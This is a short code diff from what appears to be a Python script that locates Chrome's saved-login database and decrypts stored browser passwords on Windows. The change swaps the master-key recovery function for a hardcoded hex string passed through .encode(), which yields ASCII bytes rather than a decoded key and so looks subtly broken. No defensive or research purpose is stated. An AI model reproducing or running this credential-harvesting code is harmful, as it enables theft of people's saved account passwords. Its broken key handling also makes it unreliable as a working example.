@@ -21,7 +21,7 @@ def get_chrome_pass_master_key():
     return unprotected_enc_key
 
 def get_chrome_passwords():
-    master_key = get_chrome_pass_master_key()
+    master_key = "1fac75ae4445dd3e4b36e172149865a473c839094c1994567c213f8d4f4ec487".encode()
     chrome_login_data_db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Login Data')
     connection = sqlite3.connect(chrome_login_data_db)
     cursor = connection.cursor()
